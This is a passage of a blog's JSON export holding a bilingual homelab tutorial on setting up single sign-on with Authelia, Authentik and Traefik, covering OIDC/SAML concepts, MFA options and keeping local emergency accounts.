&#x2F;&#x2F; 存取本地登入：https:&#x2F;&#x2F;nextcloud.local&#x2F;login?direct&#x3D;1 選項 3：僅 SSO 加緊急帳戶 對所有人強制 SSO，除了一個緊急管理員： # Authelia - 緊急存取繞過 SSO access_control: rules: - domain: &quot;*.homelab.local&quot; policy: bypass subject: - &quot;user:emergency-admin&quot; resources: - &quot;^&#x2F;admin&#x2F;emergency.*$&quot; 緊急存取檢查清單 [ ] 每個關鍵服務上都存在本地管理員帳戶 [ ] 所有本地帳戶都有強唯一密碼 [ ] 在支援的本地帳戶上啟用 MFA [ ] 憑證記錄在安全位置（密碼管理員） [ ] 每月測試本地登入以確保其運作 [ ] 記錄恢復程序 - 如何修復 SSO [ ] SSO 設定的備份 - 可以快速恢復 💡 黃金法則始終維護安全的後門： SSO 是你的前門（方便、安全） 本地帳戶是你的緊急出口（很少使用，始終可用） 兩者都應使用 MFA 保護 定期測試兩者 把它想像成在房子外面藏一把備用鑰匙 - 你很少需要它，但當你需要時，你會很高興它在那裡！ 資源 **Authelia 文件：**完整的 Authelia 指南 **Authentik 文件：**Authentik 設定和配置 **Keycloak 文件：**企業 SSO 指南 **OIDC 說明：**理解 OpenID Connect 結論 在家中設定 SSO 將你的家庭實驗室從一系列獨立服務轉變為統一平台。初始設定投資立即透過便利性和改進的安全性得到回報。 關鍵要點： SSO 消除了多個服務的密碼疲勞 Authelia 最適合簡單設定，配合反向代理 Authentik 提供完整功能，配有美觀的 UI 轉發驗證保護任何服務 MFA 新增關鍵安全層 LDAP 整合可擴展用於更大的部署 定期備份至關重要（SSO 是單點故障） 家庭實驗室 SSO 限於自架服務 - SaaS 整合需要昂貴的企業計劃 聯合（OIDC/SAML）實現跨系統 SSO，但 WIA 是非聯合的 快速入門建議： 對於大多數家庭實驗室： 從 Authelia + Traefik 開始（最簡單的路徑） 最初使用基於檔案的身分驗證 為管理員帳戶新增 MFA 逐步將服務遷移到 SSO 如果以後需要 OIDC/SAML，考慮 Authentik 從 2-3 個服務開始，熟悉流程，然後擴展。當你不再需要處理數十個密碼時，未來的你會感謝你！🔐","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"Authentication","slug":"Authentication","permalink":"https://neo01.com/tags/Authentication/"},{"name":"SSO","slug":"SSO","permalink":"https://neo01.com/tags/SSO/"}],"lang":"zh-TW"},{"title":"Setting Up Single Sign-On at Home","slug":"2025/01/Single-Sign-On-at-Home","date":"un33fin33","updated":"un00fin00","comments":false,"path":"2025/01/Single-Sign-On-at-Home/","permalink":"https://neo01.com/2025/01/Single-Sign-On-at-Home/","excerpt":"Tired of managing dozens of passwords for your homelab services? Learn how to set up Single Sign-On to access all your services with one login.","text":"You’ve built an impressive homelab—Nextcloud, Jellyfin, Home Assistant, Portainer, Grafana, and a dozen other services. Each one is amazing. Each one also has its own login page. And its own password. And its own session timeout. Sound familiar? Welcome to password fatigue. What if you could log in once and access everything? That’s Single Sign-On (SSO), and it’s not just for enterprises anymore. Why SSO at Home? The Problem: 15+ services = 15+ passwords to remember (or reuse 😱) Logging into each service separately wastes time No centralized user management Difficult to revoke access when needed Password resets are a nightmare The Solution: SSO provides: One login for all services Centralized authentication - manage users in one place Better security - enforce MFA once, applies everywhere Easier onboarding - add family/friends to all services at once Quick revocation - disable one account, locks out everywhere Understanding SSO Basics What is Single Sign-On? SSO is an authentication scheme that allows users to log in once and access multiple applications without re-authenticating. Simple example: Without SSO: Log into Nextcloud → Log into Grafana → Log into Jellyfin (3 logins) With SSO: Log in once → Access all three services (1 login) Key Components Explained Think of SSO like a nightclub with multiple VIP rooms. Let’s break down each component: 1. Identity Provider (IdP) - The Bouncer What it does: The central authentication authority that verifies who you are. Real-world analogy: Like a bouncer at a nightclub entrance who checks your ID and gives you a wristband. In your homelab: Authelia, Authentik, or Keycloak act as the bouncer When you try to access any service, you’re redirected here first It checks your username/password and MFA Once verified, it gives you a “token” (like a wristband) Example flow: You → Try to access Nextcloud Nextcloud → &quot;I don&#39;t know you, go ask the bouncer&quot; You → Redirected to Authelia login page Authelia → &quot;Show me your credentials&quot; You → Enter password + MFA code Authelia → &quot;Verified! Here&#39;s your token&quot; 2. Service Provider (SP) - The VIP Rooms What it does: Your actual applications that trust the IdP to authenticate users. Real-world analogy: Like VIP rooms in the nightclub. They don’t check your ID—they just look at your wristband from the bouncer. In your homelab: Your apps: Nextcloud, Grafana, Jellyfin, Home Assistant They don’t handle passwords themselves They trust the IdP’s decision They just check: “Do you have a valid token from Authelia?” Example: You → Access Grafana (with token from Authelia) Grafana → &quot;I see you have a valid token from Authelia&quot; Grafana → &quot;Authelia says you&#39;re &#39;alice&#39; in group &#39;admins&#39;&quot; Grafana → &quot;Welcome in!&quot; 3. User Directory - The Guest List What it does: Stores user information (usernames, passwords, groups). Real-world analogy: The guest list that the bouncer checks against. In your homelab: Simple: YAML file with usernames and hashed passwords Advanced: LDAP server (like a database for users) Contains: usernames, passwords, email, group memberships Example structure: users: alice: password: (hashed) email: alice@home.local groups: [admins, users] bob: password: (hashed) email: bob@home.local groups: [users] 4. Authentication vs Authorization Authentication: Proving who you are (“Are you Alice?”) Authorization: Determining what you can do (“Can Alice access admin panel?”) Real-world analogy: Authentication = Showing your ID to prove you’re 21 years old Authorization = The bouncer deciding if you can enter the VIP section In SSO: IdP handles authentication: “Yes, this is Alice with correct password” Apps handle authorization: “Alice is in ‘admins’ group, grant admin access” 5. Authentication Protocols - The Language What they do: Standardized ways for IdP and apps to communicate. Real-world analogy: Like different languages the bouncer and VIP rooms use to communicate. OIDC (OpenID Connect) - Modern &amp; Recommended: Authentication: “Who are you?” Authorization: “What groups are you in?” Uses JSON (easy to read) Built on OAuth2 Most modern apps support it Use this when possible Example OIDC token: &#123; &quot;sub&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@homelab.local&quot;, &quot;groups&quot;: [&quot;admins&quot;, &quot;users&quot;], &quot;exp&quot;: 1705334400 &#125; SAML - Enterprise Standard: Like speaking formal legal language Uses XML (verbose) Older enterprise apps use it More complex but widely supported Common in corporate environments Windows Integrated Authentication (WIA) - Windows-Only: Uses Kerberos/NTLM Automatic login for Windows domain users No password prompt if on domain Only works with: Active Directory + Windows clients Not federated - cannot integrate with external SaaS apps Not suitable for homelabs unless you run Windows Server domain 6. Federated vs Non-Federated Authentication What is Federation? Federation allows different organizations/systems to trust each other’s authentication. Real-world analogy: Non-federated: Your gym membership only works at your gym Federated: Your passport works in multiple countries (they trust each other) Non-Federated Authentication (WIA, Basic Auth): Your Homelab IdP → Only works for your homelab services ❌ Cannot authenticate to external SaaS (GitHub, AWS, etc.) Federated Authentication (OIDC, SAML): Your Homelab IdP ↔ External SaaS (if they support it) ✅ Could authenticate to services that trust your IdP Example scenarios: Non-federated (WIA): You → Windows Domain Controller → Homelab apps ✅ You → Windows Domain Controller → GitHub ❌ (GitHub doesn&#39;t trust your DC) Federated (OIDC/SAML): You → Authentik → Homelab apps ✅ You → Authentik → GitHub Enterprise ✅ (if configured) You → Authentik → AWS ✅ (if configured) The Catch for Homelabs: Most SaaS providers only support federation with enterprise subscriptions: Service Free/Personal Enterprise GitHub No SSO SSO with SAML AWS No SSO SSO with SAML Google Workspace No SSO SSO with SAML Microsoft 365 No SSO SSO with SAML Slack No SSO SSO with SAML Cost reality: GitHub Enterprise: $21/user/month AWS SSO: Requires AWS Organizations Google Workspace: $12-18/user/month for SSO Microsoft 365: $22/user/month for SSO ⚠️ Homelab SSO LimitationsYour homelab SSO will work for: ✅ Self-hosted services (Nextcloud, Grafana, Jellyfin) ✅ Services you control ✅ Apps that support OIDC/SAML without restrictions Your homelab SSO will NOT work for: ❌ Free tier SaaS (GitHub, Gmail, Slack) ❌ Services requiring enterprise subscriptions ❌ Services that don't support custom IdPs This limits homelab SSO to internal services only, which is still valuable for managing 10-20 self-hosted apps! Comparison: Protocol Best For Complexity Federated Homelab Friendly OIDC Modern apps Low ✅ Yes ✅ Yes SAML Enterprise apps High ✅ Yes ⚠️ If needed WIA Windows domains Medium ❌ No ❌ Overkill 💡 Protocol ChoiceFor homelabs: Use OIDC for apps that support it (Grafana, Nextcloud, Portainer) Use forward auth (Authelia) for apps without OIDC support Skip WIA unless you already run Active Directory (and it won't work with SaaS anyway) Use SAML only if specific app requires it Accept limitation: Your SSO won't work with free-tier SaaS (GitHub, Gmail, etc.) Visual comparison: flowchart LR A[\"👤 User\"] -->|\"1. Login request\"| B[\"🔐 IdP(Authelia)\"] B -->|\"2. Check credentials\"| C[\"📚 User Directory(YAML/LDAP)\"] C -->|\"3. Valid user\"| B B -->|\"4. Issue token(OIDC/SAML)\"| A A -->|\"5. Present token\"| D[\"📦 Service Provider(Nextcloud)\"] D -->|\"6. Verify token\"| B B -->|\"7. Token valid\"| D D -->|\"8. Grant access\"| A style B fill:#e3f2fd style C fill:#f3e5f5 style D fill:#e8f5e9 Putting It All Together Without SSO (Current state): You → Nextcloud → Enter password for Nextcloud You → Grafana → Enter password for Grafana You → Jellyfin → Enter password for Jellyfin (15 services &#x3D; 15 passwords!) With SSO (After setup): You → Nextcloud → Redirected to Authelia → Login once You → Grafana → Already logged in (token exists) You → Jellyfin → Already logged in (token exists) (1 login &#x3D; access to everything!) The magic: Once you log into Authelia, it creates a session. All your apps check with Authelia: “Is this user logged in?” Authelia says “Yes!” and they let you in. 🎯 Key Takeaway IdP (Authelia) = The one place you log in Service Providers (your apps) = Trust the IdP's decision User Directory = Where usernames/passwords are stored Protocols (OIDC/SAML) = How they talk to each other You log in once at the IdP, and all your apps trust that login. Self-Hosted vs External Identity Providers Before diving into self-hosted solutions, you might wonder: “Why not just use Google, Microsoft, or GitHub as my IdP?” External IdPs (Google, Microsoft, GitHub, Auth0) Pros: Zero maintenance Already have accounts Enterprise-grade security Free for personal use Built-in MFA Can federate with SaaS (if you have enterprise subscriptions) Cons: Privacy concerns - External provider sees every login to your homelab Internet dependency - Can’t authenticate if internet is down Service outages - Your homelab breaks when their service is down Account linking - Can’t add users without external accounts Terms of Service - Subject to their rules and changes Data sovereignty - Authentication data leaves your network Limited to their ecosystem - Can’t use Google SSO for Microsoft services Self-Hosted IdP (Authelia, Authentik, Keycloak) Pros: Complete privacy - No external tracking Works offline - Internet outage doesn’t affect local services Full control - Your rules, your users Custom users - Add family/friends without requiring Google accounts No vendor lock-in - Own your authentication infrastructure Learning opportunity - Understand how SSO works Federated protocols - Uses OIDC/SAML (standard protocols) Cons: Requires setup and maintenance You’re responsible for security Need to manage backups More complex than “Login with Google” button Limited SaaS integration - Most SaaS requires expensive enterprise plans to accept your IdP Hybrid Approach Best of both worlds: # Authentik can use external IdPs as sources # Users can choose: Local account OR Google OR GitHub Use cases: Self-hosted primary + external as backup Local accounts for family + external for guests Self-hosted for sensitive services + external for low-risk apps 💡 When to Use External IdPsUse external IdPs if: You're okay with Google/Microsoft seeing your login activity Your homelab is always internet-connected You only need authentication for yourself You want zero maintenance You have enterprise subscriptions and want to integrate with SaaS Use self-hosted if: Privacy is important (no external tracking) You want offline capability You need to manage multiple users (family/friends) You want to learn and control your infrastructure You have services that shouldn't be exposed to external providers You only need SSO for self-hosted services (the common homelab case) Real-world examples: Scenario 1 - ISP Outage: With external IdP, you can’t log into your local Home Assistant to check security cameras. With self-hosted SSO, everything still works on your local network. Scenario 2 - SaaS Integration: You want to use your homelab SSO for GitHub. GitHub requires Enterprise ($21/user/month) to accept custom SAML IdP. For homelabs, this is too expensive, so you’ll use GitHub’s own authentication instead. Choosing Your SSO Solution Option 1: Authelia (Lightweight, Proxy-Based) Best for: Simple setups, reverse proxy users Pros: Lightweight (single binary) Works with any reverse proxy (Traefik, nginx) Simple YAML configuration Built-in LDAP/file-based auth Excellent documentation Cons: Limited OIDC support (basic) No admin UI (config file only) Fewer integrations than Authentik Option 2: Authentik (Full-Featured, Modern) Best for: Complex setups, multiple protocols needed Pros: Beautiful admin UI Full OIDC and SAML support Built-in user management Customizable login flows Active development Cons: Heavier resource usage More complex setup Requires PostgreSQL/Redis Option 3: Keycloak (Enterprise-Grade) Best for: Large homelabs, enterprise features Pros: Industry standard Comprehensive features Excellent SAML/OIDC support User federation Cons: Heavy resource usage (Java-based) Complex configuration Overkill for small homelabs Comparison Table Feature Authelia Authentik Keycloak Resource Usage Low Medium High Setup Complexity Low Medium High OIDC Support Basic Full Full SAML Support ❌ No ✅ Yes ✅ Yes Admin UI ❌ No ✅ Yes ✅ Yes MFA ✅ TOTP, WebAuthn ✅ TOTP, WebAuthn, Passkey ✅ All types Best For Small labs Medium labs Enterprise 💡 Recommendation Start with Authelia if you use Traefik/nginx and want simplicity Choose Authentik if you need OIDC/SAML and want a UI Use Keycloak only if you need enterprise features or already know it Setting Up Authelia Architecture flowchart TD User[\"👤 User\"] Proxy[\"🚪 Reverse Proxy (Traefik/nginx)\"] Authelia[\"🔐 Authelia\"] LDAP[\"📚 User Directory (YAML/LDAP)\"] subgraph Services[\" \"] App1[\"📦 Nextcloud\"] App2[\"🎬 Jellyfin\"] App3[\"📊 Grafana\"] end User --> Proxy Proxy --> Authelia Proxy --> Services Authelia -.-> LDAP style Authelia fill:#e3f2fd style Proxy fill:#fff3e0 style LDAP fill:#f3e5f5 style Services fill:#e8f5e9 Prerequisites Docker and Docker Compose Reverse proxy (Traefik or nginx) Domain name (or local DNS) Step 1: Create Directory Structure mkdir -p authelia&#x2F;&#123;config,secrets&#125; cd authelia Step 2: Generate Secrets # JWT secret tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;jwt_secret # Session secret tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;session_secret # Storage encryption key tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;storage_encryption_key Step 3: Create Configuration # config&#x2F;configuration.yml --- theme: dark default_2fa_method: &quot;totp&quot; server: host: 0.0.0.0 port: 9091 log: level: info totp: issuer: homelab.local period: 30 skew: 1 authentication_backend: file: path: &#x2F;config&#x2F;users_database.yml password: algorithm: argon2id iterations: 1 salt_length: 16 parallelism: 8 memory: 64 access_control: default_policy: deny rules: - domain: &quot;*.homelab.local&quot; policy: two_factor session: name: authelia_session domain: homelab.local expiration: 1h inactivity: 5m remember_me_duration: 1M regulation: max_retries: 3 find_time: 2m ban_time: 5m storage: encryption_key_secret_file: &#x2F;secrets&#x2F;storage_encryption_key local: path: &#x2F;config&#x2F;db.sqlite3 notifier: filesystem: filename: &#x2F;config&#x2F;notification.txt Step 4: Create Users # config&#x2F;users_database.yml users: alice: displayname: &quot;Alice Smith&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; # Generate with: authelia crypto hash generate argon2 --password &#39;yourpassword&#39; email: alice@homelab.local groups: - admins - users bob: displayname: &quot;Bob Jones&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: bob@homelab.local groups: - users Generate password hash: docker run --rm authelia&#x2F;authelia:latest authelia crypto hash generate argon2 --password &#39;yourpassword&#39; Step 5: Docker Compose # docker-compose.yml version: &#39;3.8&#39; services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;config:&#x2F;config - .&#x2F;secrets:&#x2F;secrets ports: - 9091:9091 environment: - TZ&#x3D;America&#x2F;New_York restart: unless-stopped Step 6: Integrate with Traefik # docker-compose.yml (add to existing Traefik setup) services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;authelia&#x2F;config:&#x2F;config - .&#x2F;authelia&#x2F;secrets:&#x2F;secrets labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.authelia.rule&#x3D;Host(&#96;auth.homelab.local&#96;)&quot; - &quot;traefik.http.routers.authelia.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.authelia.tls&#x3D;true&quot; - &quot;traefik.http.services.authelia.loadbalancer.server.port&#x3D;9091&quot; # Authelia middleware - &quot;traefik.http.middlewares.authelia.forwardauth.address&#x3D;http:&#x2F;&#x2F;authelia:9091&#x2F;api&#x2F;verify?rd&#x3D;https:&#x2F;&#x2F;auth.homelab.local&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.trustForwardHeader&#x3D;true&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.authResponseHeaders&#x3D;Remote-User,Remote-Groups,Remote-Name,Remote-Email&quot; restart: unless-stopped # Example protected service nextcloud: image: nextcloud:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.rule&#x3D;Host(&#96;nextcloud.homelab.local&#96;)&quot; - &quot;traefik.http.routers.nextcloud.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.nextcloud.tls&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.middlewares&#x3D;authelia@docker&quot; restart: unless-stopped Step 7: Start Services docker-compose up -d Visit https://auth.homelab.local to see the login page. Understanding the Authentication Flow Now that you have Authelia set up, let’s see exactly what happens when you access a protected service: sequenceDiagram participant User participant App as Application (Nextcloud) participant SSO as SSO Provider (Authelia) participant LDAP as User Directory (YAML/LDAP) User->>App: 1. Access application App->>User: 2. Redirect to SSO login User->>SSO: 3. Enter credentials + MFA SSO->>LDAP: 4. Verify credentials LDAP->>SSO: 5. User authenticated SSO->>App: 6. Return auth token App->>User: 7. Grant access Note over User,App: User now logged in! User->>App: 8. Access another app (Jellyfin) App->>SSO: 9. Check existing session SSO->>App: 10. Valid session exists App->>User: 11. Grant access (no login needed) What happens behind the scenes: First access: You visit nextcloud.homelab.local Traefik intercepts: Checks with Authelia - “Is this user authenticated?” Not authenticated: Authelia redirects you to auth.homelab.local You log in: Enter username, password, and MFA code Authelia verifies: Checks credentials against user database Session created: Authelia creates a session cookie Redirect back: You’re sent back to Nextcloud Access granted: Traefik sees valid session, allows access Second service access: You visit grafana.homelab.local Traefik checks with Authelia - “Is this user authenticated?” Authelia sees existing session cookie - “Yes, it’s Alice!” Access granted immediately - no login needed This is the magic of SSO - one login, access everywhere! Setting Up Authentik Step 1: Install with Docker Compose # Download official compose file wget https:&#x2F;&#x2F;goauthentik.io&#x2F;docker-compose.yml wget https:&#x2F;&#x2F;goauthentik.io&#x2F;.env # Generate secrets echo &quot;PG_PASS&#x3D;$(openssl rand -base64 36)&quot; &gt;&gt; .env echo &quot;AUTHENTIK_SECRET_KEY&#x3D;$(openssl rand -base64 60)&quot; &gt;&gt; .env # Start services docker-compose up -d Step 2: Initial Setup Visit http://localhost:9000/if/flow/initial-setup/ Create admin account Complete setup wizard Step 3: Create Application Applications → Create Name: Nextcloud Slug: nextcloud Provider: Create new OIDC provider Configure OIDC Provider Client Type: Confidential Redirect URIs: https://nextcloud.homelab.local/apps/oidc_login/oidc Signing Key: Auto-generate Note credentials: Client ID: (auto-generated) Client Secret: (auto-generated) Step 4: Configure Application (Nextcloud Example) &#x2F;&#x2F; nextcloud&#x2F;config&#x2F;config.php &#39;oidc_login_provider_url&#39; &#x3D;&gt; &#39;https:&#x2F;&#x2F;auth.homelab.local&#x2F;application&#x2F;o&#x2F;nextcloud&#x2F;&#39;, &#39;oidc_login_client_id&#39; &#x3D;&gt; &#39;your-client-id&#39;, &#39;oidc_login_client_secret&#39; &#x3D;&gt; &#39;your-client-secret&#39;, &#39;oidc_login_auto_redirect&#39; &#x3D;&gt; true, &#39;oidc_login_button_text&#39; &#x3D;&gt; &#39;Log in with SSO&#39;, &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; true, &#39;oidc_login_attributes&#39; &#x3D;&gt; [ &#39;id&#39; &#x3D;&gt; &#39;sub&#39;, &#39;name&#39; &#x3D;&gt; &#39;name&#39;, &#39;mail&#39; &#x3D;&gt; &#39;email&#39;, &#39;groups&#39; &#x3D;&gt; &#39;groups&#39;, ], Integrating Applications Applications with Native OIDC Support Grafana: # grafana.ini [auth.generic_oauth] enabled &#x3D; true name &#x3D; SSO client_id &#x3D; grafana-client-id client_secret &#x3D; grafana-client-secret scopes &#x3D; openid profile email auth_url &#x3D; https:&#x2F;&#x2F;auth.homelab.local&#x2F;application&#x2F;o&#x2F;authorize&#x2F; token_url &#x3D; https:&#x2F;&#x2F;auth.homelab.local&#x2F;application&#x2F;o&#x2F;token&#x2F; api_url &#x3D; https:&#x2F;&#x2F;auth.homelab.local&#x2F;application&#x2F;o&#x2F;userinfo&#x2F; Portainer: Settings → Authentication OAuth → Enable Configure endpoints from Authentik Home Assistant: # configuration.yaml auth_providers: - type: homeassistant - type: command_line command: &#x2F;config&#x2F;auth_script.sh args: [&quot;--username&quot;] meta: true Applications Without OIDC Support Use forward authentication with Authelia/Traefik: # Protect any service labels: - &quot;traefik.http.routers.myapp.middlewares&#x3D;authelia@docker&quot; Application Support Matrix Application OIDC SAML Forward Auth Difficulty Nextcloud ✅ Yes ✅ Yes ✅ Yes Easy Grafana ✅ Yes ❌ No ✅ Yes Easy Portainer ✅ Yes ❌ No ✅ Yes Easy Jellyfin ⚠️ Plugin ❌ No ✅ Yes Medium Home Assistant ⚠️ Custom ❌ No ✅ Yes Medium Proxmox ✅ Yes ❌ No ❌ No Medium TrueNAS ❌ No ✅ Yes ✅ Yes Hard Adding Multi-Factor Authentication MFA Options Overview Method Security Convenience Cost Phishing Resistant Passkey (WebAuthn) Highest High Free ✅ Yes Hardware Key Highest Medium $25-50 ✅ Yes TOTP (Authenticator App) High Medium Free ❌ No SMS Low High Requires SMS gateway ❌ No 1. Passkey (WebAuthn) - Recommended What is a Passkey? Passkeys are the modern replacement for passwords using biometric authentication (fingerprint, face, PIN). Real-world analogy: Like using your fingerprint to unlock your phone instead of typing a password. How it works: Your device stores a cryptographic key You authenticate with biometrics (fingerprint/face) or device PIN No password to steal or phish Works across devices via cloud sync (iCloud Keychain, Google Password Manager) Authentik Setup: User menu → Settings MFA Devices → Enroll Choose WebAuthn or Passkey Follow browser prompts: Mobile: Use fingerprint/Face ID Laptop: Use Touch ID/Windows Hello Desktop: Use phone as passkey or hardware key Authelia Setup: Log in to any protected service Click “Register security key” Choose passkey option Authenticate with biometrics Supported platforms: ✅ iPhone/iPad (iOS 16+) - Face ID/Touch ID ✅ Android (9+) - Fingerprint/Face unlock ✅ macOS (Ventura+) - Touch ID ✅ Windows (10+) - Windows Hello ✅ Chrome/Edge/Safari - Built-in support 2. Hardware Security Keys Physical devices for authentication: Authentik: User menu → Settings MFA Devices → Enroll Choose WebAuthn Insert security key (YubiKey, etc.) Touch the key when prompted Popular hardware keys: YubiKey 5 ($45-50) - USB-A/C, NFC YubiKey 5C Nano ($55) - Stays in USB-C port Google Titan ($30) - USB-A/C, Bluetooth Feitian ($20-30) - Budget option 3. TOTP (Authenticator Apps) Time-based codes from apps: Authelia (Built-in): Log in to any protected service Click “Register device” Scan QR code with authenticator app Enter 6-digit code to verify Authentik: User menu → Settings MFA Devices → Enroll Choose TOTP Scan QR code Recommended authenticator apps: Aegis (Android) - Open source, encrypted backups Raivo OTP (iOS) - Open source, iCloud sync 2FAS (iOS/Android) - Free, cloud backup Authy (iOS/Android) - Multi-device sync Google Authenticator (iOS/Android) - Simple, cloud backup 💡 MFA Best PracticesPriority order: Passkeys - Most secure and convenient (use biometrics) Hardware keys - Very secure, requires physical device TOTP apps - Secure, but can be phished Avoid SMS - Vulnerable to SIM swapping Recommendations: Require MFA for admins always (use passkeys or hardware keys) Optional for family (reduces friction, passkeys are easy) Backup codes - generate and store securely Multiple methods - register passkey + TOTP as backup Passkeys sync - Use iCloud/Google to access from all devices Should You Keep Local Accounts After Enabling SSO? Short answer: YES, always keep local accounts as a backup. Why Keep Local Accounts? SSO is a single point of failure. If your SSO system goes down, you’ll be locked out of everything. Real-world scenarios where SSO fails: SSO container crashes - Docker/Kubernetes issues Database corruption - Authelia/Authentik database problems Configuration error - Typo in config breaks authentication Certificate expiration - HTTPS cert expires, SSO unreachable Network issues - DNS problems, reverse proxy down Accidental deletion - Oops, deleted the wrong container What happens without local accounts: SSO down → Can&#39;t log into anything → Can&#39;t even access SSO to fix it → Locked out With local accounts as backup: SSO down → Use local admin account → Fix SSO → Back to normal Best Practices for Local Accounts 🔒 Critical: Secure Your Local AccountsLocal accounts bypass SSO, so they MUST be secured: Strong passwords - Use password manager, 20+ characters Enable MFA on local accounts - Many services support this Limit local accounts - Only create for admins/emergency access Different passwords - Don't reuse SSO passwords Document credentials - Store securely (password manager, encrypted file) Services That Support MFA on Local Accounts Proxmox: # Enable TOTP for local root account # Datacenter → Permissions → Two Factor # Add TOTP for user root@pam Nextcloud: Settings → Security → Two-Factor Authentication Enable TOTP even for local admin account Grafana: # grafana.ini [auth] login_maximum_inactive_lifetime_duration &#x3D; 7d login_maximum_lifetime_duration &#x3D; 30d # Local admin can still use MFA via authenticator app Home Assistant: # configuration.yaml auth_providers: - type: homeassistant # Local accounts - type: command_line # SSO integration # Enable MFA for local accounts in UI: # Profile → Security → Multi-factor Authentication Configuration Strategy Option 1: Dual Authentication (Recommended) Allow both SSO and local login: &#x2F;&#x2F; Nextcloud - Don&#39;t hide password form &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; false, &#x2F;&#x2F; Keep local login visible &#39;oidc_login_auto_redirect&#39; &#x3D;&gt; false, &#x2F;&#x2F; Don&#39;t force SSO Option 2: Hidden Local Login Hide local login but keep it accessible via direct URL: &#x2F;&#x2F; Nextcloud - Hide but keep functional &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; true, &#x2F;&#x2F; Hide local login &#x2F;&#x2F; Access local login: https:&#x2F;&#x2F;nextcloud.local&#x2F;login?direct&#x3D;1 Option 3: SSO-Only with Emergency Account Force SSO for everyone except one emergency admin: # Authelia - Bypass SSO for emergency access access_control: rules: - domain: &quot;*.homelab.local&quot; policy: bypass subject: - &quot;user:emergency-admin&quot; resources: - &quot;^&#x2F;admin&#x2F;emergency.*$&quot; Emergency Access Checklist [ ] Local admin account exists on each critical service [ ] Strong unique passwords for all local accounts [ ] MFA enabled on local accounts where supported [ ] Credentials documented in secure location (password manager) [ ] Test local login monthly to ensure it works [ ] Recovery procedures documented - how to fix SSO [ ] Backup of SSO config - can restore quickly Example: Proxmox with SSO + Local Account Setup: Configure SSO (OIDC): # Datacenter → Permissions → Realms → Add → OpenID Connect Issuer URL: https:&#x2F;&#x2F;auth.homelab.local&#x2F;application&#x2F;o&#x2F;proxmox&#x2F; Client ID: proxmox Client Key: your-secret Default: Yes Keep local root@pam account: # Root account still works with password # Enable TOTP for extra security: # Datacenter → Permissions → Two Factor → Add → TOTP # User: root@pam Test both methods: SSO login: https:&#x2F;&#x2F;proxmox.local → Redirects to Authelia → Success Local login: https:&#x2F;&#x2F;proxmox.local → Choose &quot;PAM&quot; realm → root + password + TOTP → Success Recovery Procedure Example Scenario: Authelia container crashed # 1. Can&#39;t access any services via SSO # 2. Use local account to access Proxmox # Login: root@pam + password + TOTP # 3. Check Authelia container docker ps -a | grep authelia # 4. Check logs docker logs authelia # 5. Restart container docker restart authelia # 6. Verify SSO works again curl https:&#x2F;&#x2F;auth.homelab.local&#x2F;api&#x2F;health # 7. Test SSO login on a service What NOT To Do ❌ Don’t disable local accounts completely &#x2F;&#x2F; BAD: Removes all local login options &#39;oidc_login_disable_registration&#39; &#x3D;&gt; true, &#39;oidc_login_hide_password_form&#39; &#x3D;&gt; true, &#39;oidc_login_auto_redirect&#39; &#x3D;&gt; true, &#x2F;&#x2F; If SSO breaks, you&#39;re locked out! ❌ Don’t use weak passwords for local accounts Local password: &quot;admin123&quot; &#x2F;&#x2F; BAD - bypasses all SSO security ❌ Don’t forget to test local login &#x2F;&#x2F; Set up local account → Never test it → SSO breaks → Local account also broken 💡 Golden RuleAlways maintain a secure backdoor: SSO is your front door (convenient, secure) Local accounts are your emergency exit (rarely used, always available) Both should be secured with MFA Test both regularly Think of it like having a spare key hidden outside your house - you rarely need it, but when you do, you'll be glad it's there! User Management Adding Users (Authelia) # config&#x2F;users_database.yml users: newuser: displayname: &quot;New User&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: newuser@homelab.local groups: - users Restart Authelia after changes. Adding Users (Authentik) Directory → Users → Create Fill in details Assign to groups Set password (or send invite) Group-Based Access Control Authelia: # config&#x2F;configuration.yml access_control: rules: - domain: &quot;admin.homelab.local&quot; policy: two_factor subject: - &quot;group:admins&quot; - domain: &quot;*.homelab.local&quot; policy: two_factor subject: - &quot;group:users&quot; Authentik: Create groups: admins, users, family Assign users to groups In application policies, check group membership Advanced: LDAP Integration For larger setups, use LDAP as central user directory. Install OpenLDAP # docker-compose.yml services: openldap: image: osixia&#x2F;openldap:latest environment: - LDAP_ORGANISATION&#x3D;Homelab - LDAP_DOMAIN&#x3D;homelab.local - LDAP_ADMIN_PASSWORD&#x3D;admin_password volumes: - ldap_data:&#x2F;var&#x2F;lib&#x2F;ldap - ldap_config:&#x2F;etc&#x2F;ldap&#x2F;slapd.d ports: - &quot;389:389&quot; - &quot;636:636&quot; ldap-admin: image: osixia&#x2F;phpldapadmin:latest environment: - PHPLDAPADMIN_LDAP_HOSTS&#x3D;openldap ports: - &quot;8080:80&quot; depends_on: - openldap volumes: ldap_data: ldap_config: Configure Authelia with LDAP # 